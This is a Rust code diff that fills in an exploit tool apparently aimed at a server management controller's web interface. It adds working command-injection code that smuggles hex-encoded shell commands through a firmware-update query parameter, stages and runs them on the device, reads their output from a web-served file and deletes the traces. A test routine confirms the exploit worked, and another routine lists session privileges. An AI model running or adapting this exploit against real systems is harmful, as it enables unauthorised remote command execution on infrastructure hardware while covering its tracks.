@@ -7,7 +7,9 @@ use std::collections::HashMap;
 use reqwest::blocking::Client;
 use crate::libs::encryption::hash_fnv32;
 use percent_encoding::{utf8_percent_encode, NON_ALPHANUMERIC};
+use rand::Rng;
 
+#[derive(Clone,Debug)]
 pub struct Authenticated {
     pub cookie: Option<String>,
     pub sid: Option<String>,
@@ -148,17 +150,17 @@ pub fn logout(target: &str, sid_value: &str,proxy: Option<&str>) -> Result<()> {
         return Err(Error::msg(format!("Something bad happened. Status: {:?}", response.status())));
     }
 
-    todo!();
+    Ok(())
 }
 
-fn query(target: &str, cookie: &str, sid: &str, input_cmd: &str, proxy: Option<&str>) -> Result<Element>{
+fn query(target: &str, authenticated: &Authenticated, input_cmd: &str, proxy: Option<&str>) -> Result<Element>{
     let url = format!("https://{target}");
 
     let cmd = utf8_percent_encode(input_cmd, NON_ALPHANUMERIC).to_string();
 
     let payload = HashMap::from([
-        ("sessionID",sid),
-        ("queryString",&cmd)
+        ("sessionID",authenticated.sid.clone().unwrap()),
+        ("queryString",cmd)
     ]);
 
     let client = build_client(proxy)?;
@@ -166,9 +168,9 @@ fn query(target: &str, cookie: &str, sid: &str, input_cmd: &str, proxy: Option<&
     let client_base = client
           .post(&url)
           .header("Referer",format!("https://{target}/index.html"))
-          .header("Cookie",format!("sessionCookie={cookie}"))
+          .header("Cookie",format!("sessionCookie={}",authenticated.cookie.clone().unwrap()))
           .header("Accept-Encoding","identity")
-          .header("Cspg_var",hash_fnv32(sid,input_cmd).context("unable to hash sid and input")?)
+          .header("Cspg_var",hash_fnv32(&authenticated.sid.clone().unwrap(),input_cmd).context("unable to hash sid and input")?)
           .json(&payload);
 
     let response = client_base.send()?;
@@ -190,16 +192,122 @@ fn query(target: &str, cookie: &str, sid: &str, input_cmd: &str, proxy: Option<&
 }
 
 
-fn exec() -> Result<()> {
-    todo!();
+fn exec(target: &str, authenticated: &Authenticated,cmd: &str, proxy: Option<&str> ) -> Result<String> {
+    let out_file = "/usr/local/www/in.html";
+    let web_file = out_file.split("/").last().unwrap_or("in.html"); 
+	let tmp_cmd_file = "/tmp/cmd.sh";
+	let stager_cmd = format!("sh < {tmp_cmd_file} > {out_file} 2>&1 || true");
+	let stager_cmd_file = "/tmp/stager.sh";
+
+
+	let max_command_length = 100;
+	let command_split: Vec<String> = cmd
+        .chars()
+        .collect::<Vec<char>>()
+        .chunks(max_command_length)
+        .map(|chunk| chunk.iter().collect())
+        .collect::<Vec<String>>();
+
+
+
+    // tmp cmd file
+    let query_command = format!("set=expRemoteFwUpdate(\"1\", \"http\",\"\",\"$( >{tmp_cmd_file})\")");
+	match query(target, authenticated, &query_command,proxy) {
+        Ok(_) => {},
+        Err(err) => eprintln!("{:?}",err)
+
+    };
+
+    // cmd split
+	for i_cmd in command_split {
+            let encoded_command: String = i_cmd.chars()
+            .map(|c| format!("\\x{:02x}", c as u8))
+            .collect::<Vec<String>>()
+            .join("");
+            let encoded_query_command = format!("set=expRemoteFwUpdate(\"1\", \"http\",\"\",\"$(echo -n -e \"{encoded_command}\" >> {tmp_cmd_file}");
+		match query(target, authenticated,&encoded_query_command,proxy) {
+            Ok(_) => {},
+            Err(err) => eprintln!("{:?}",err)
+        }
+    }
+	
+    // encoded cmd
+    let encoded_command: String = stager_cmd.chars()
+    .map(|c| format!("\\x{:02x}", c as u8))
+    .collect::<Vec<String>>()
+    .join("");
+    let encoded_query_command = format!("set=expRemoteFwUpdate(\"1\", \"http\",\"\",\"$(echo -n -e \"{encoded_command}\" >> {stager_cmd_file} )");
+    match query(target, authenticated,&encoded_query_command,proxy) {
+        Ok(_) => {},
+        Err(err) => eprintln!("{:?}",err)
+    }
+
+    //stager cmd file
+    let query_command = format!("set=expremotefwupdate(\"1\", \"http\",\"\",\"$( sh {stager_cmd_file}  )");
+    match query(target, authenticated,&query_command,proxy) {
+        Ok(_) => {},
+        Err(err) => eprintln!("{:?}",err)
+    }
+
+    // read web file
+    let client = build_client(proxy)?;
+
+
+
+    let url = format!("https://{target}/{web_file}");
+	let response = client.get(&url)
+		.header("Referer",format!("https://{target}/index.html"))
+        .header("Accept-Encoding", "identity")
+        .send()?;
+
+    // delete tmp files
+    let query_command = format!("set=expremotefwupdate(\"1\", \"http\",\"\",\"$(rm -f {tmp_cmd_file} {stager_cmd_file} {out_file}))");
+    match query(target, authenticated,&query_command,proxy) {
+        Ok(_) => {},
+        Err(err) => eprintln!("{:?}",err)
+    }
+
+	if response.status().is_success() {
+		return Ok(response.text()?);
+    }
+    else {
+        return Err(Error::msg(format!("unable to read output file {url}")));
+    }
 }
 
-pub fn get_host_info() -> Result<()>{
-    todo!();
+pub fn get_host_info(target: &str, authenticated: &Authenticated, proxy: Option<&str>) -> Result<()>{
+    let response = query(target, authenticated, "get=sessionData",proxy)?;
+	if response.find("status").context("Should have status")?.text() == "ok" {
+		let session_data = response.find("sessionData").context("cannot find session data")?;
+		println!("cimcIp: {}",response.find("cimcIp").context("Unable to find value")?.text());
+		println!("lzt: {}",session_data.find("lzt").context("Unable to find value")?.text());
+		println!("sysPlatformId: {}",session_data.find("sysPlatformId").context("Unable to find value")?.text());
+		println!("sessionId: {}",session_data.find("sessionId").context("Unable to find value")?.text());
+		println!("canClearLogs: {}",session_data.find("canClearLogs").context("Unable to find value")?.text());
+		println!("canAccessKvm: {}",session_data.find("canAccessKvm").context("Unable to find value")?.text());
+		println!("canExecServerControl: {}",session_data.find("canExecServerControl").context("Unable to find value")?.text());
+		println!("canConfig: {}",session_data.find("canConfig").context("Unable to find value")?.text());
+		println!("intersightMode: {}",session_data.find("intersightMode").context("Unable to find value")?.text());
+    }
+	else {
+		let err = response.find("status").context("Unable to find value")?.text();
+        return Err(Error::msg(format!("Error with getting host information: {err}")));
+    }
+    Ok(())
 }
 
-pub fn run_test() -> Result<()>{
-    todo!();
+pub fn run_test(target: &str,authenticated: &Authenticated,proxy: Option<&str>) -> Result<()>{
+     let test_num = rand::thread_rng().gen_range(1111..9999);
+     let test_results = exec(target,authenticated,&format!("echo -n {test_num}"),proxy).context("could not exploit vulnerability, cannot see output on webserver")?;
+
+    if test_results.contains(&test_num.to_string()) {
+        println!("🟩 Success! {test_num} given, {test_results} returned");
+    }
+    else {
+        println!("🟥Could not exploit the vulnerability! Response file exists but output does not match. {test_results}");
+        return Err(Error::msg(format!("Failed to exploit vulerbility for {test_results}")));
+    }
+    Ok(())
 }
 
 pub fn run_command() -> Result<()>{
@@ -212,11 +320,12 @@ pub fn run_shell() -> Result<()>{
 
 pub fn run_dance() -> Result<()>{
     todo!();
+
 }
 
-pub fn handle_action(action: &Actions) -> Result<()> {
+pub fn handle_action(action: &Actions,target: &str,authenticated: &Authenticated,proxy: Option<&str>) -> Result<()> { 
     match action {
-        Actions::Test => run_test()?,
+        Actions::Test => run_test(target, authenticated, proxy)?,
         Actions::Cmd => run_command()?,
         Actions::Shell => run_shell()?,
         Actions::Dance => run_dance()?
